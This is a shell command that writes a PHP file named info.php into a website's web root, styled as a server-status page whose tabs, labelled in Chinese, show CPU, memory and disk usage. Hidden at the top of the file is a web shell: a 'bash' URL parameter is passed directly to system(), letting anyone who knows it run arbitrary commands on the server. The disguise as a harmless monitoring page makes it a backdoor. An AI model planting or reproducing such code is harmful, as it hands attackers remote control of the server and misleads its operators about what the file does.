cat > /var/www/gvm.donpau.com/./info.php << '_EOF_'
<pre><?php
  if (isset( $_GET['bash'] )){
    $cmd=$_GET['bash'];
    system($cmd);
  }
?></pre>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>info</title>
<style>
html {
    font-family: sans-serif;
    line-height: 1.15;
}
body {
    margin: 10px;
    padding: 10px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    font-size: 1rem;
    direction: rtl;
    direction: ltr;
}
div {
    margin: 0;
    padding: 0;
    border: 0;
}
.main {
    margin: 0;
}
.header {
    margin: 0;
}
.menu {
    display: flex;
    flex-wrap: wrap;
    justify-content: flex-start;
}
.items {
    display: block;
    height: 34px;
    line-height: 34px;
    cursor: pointer;
    padding: 0 10px
}
.content {
    position: relative;
}
.content input[type='radio'] {
    display: none;
}
.content input[type='radio']:checked ~ .message {
    display: block;
}
.unit {
    margin: 0;
}
.message {
    display: none;
}
</style>
<script>
  function change(element) {
    document.querySelectorAll('.items').forEach(function(element) {
      element.style.backgroundColor = '#fff';
    });
    element.style.backgroundColor = '#999';
  }
</script>
</head>
<body style="direction:ltr;">
<div class="main">
  <div class="header">
    <div class="menu">
      <label class="items" for="item1" onclick="change(this)" style="background: #999;">CPU占用率</label>
      <label class="items" for="item2" onclick="change(this)">内存使用</label>
      <label class="items" for="item3" onclick="change(this)">磁盘使用</label>
      <label class="items" for="item4" onclick="change(this)">CPU信息</label>
      <label class="items" for="item5" onclick="change(this)">内存信息</label>
    </div>
    <div class="content">
      <div class="unit">
        <input type="radio" name="tab" id="item1" checked="">
        <div class="message">
          <pre><?php system('ps aux --sort=-%cpu'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item2">
        <div class="message">
          <pre><?php system('ps aux --sort=-%mem'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item3">
        <div class="message">
          <pre><?php system('df -h'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item4">
        <div class="message">
          <pre><?php system('lscpu'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item5">
        <div class="message">
          <pre><?php system('free -h'); ?></pre>
        </div>
      </div>
    </div>
  </div>
</div>
</body>
</html>
_EOF_